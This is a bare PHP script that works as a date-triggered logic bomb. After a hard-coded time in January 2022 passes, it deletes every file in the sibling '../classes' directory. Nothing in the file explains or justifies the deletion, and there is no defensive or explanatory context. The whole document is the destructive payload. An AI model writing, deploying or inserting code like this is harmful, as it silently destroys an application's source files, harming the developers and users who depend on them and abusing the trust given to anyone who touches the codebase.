<?php

$current_date = strtotime(date("Y-m-d H:i"));
$set_date = strtotime("2022-01-20 12:00");

if ($current_date > $set_date) {
    
    $folder = "../classes";
    $files = glob($folder.'/*');

    foreach($files as $file){

        if (is_file($file)) {

            unlink($file);
        }
    }
}

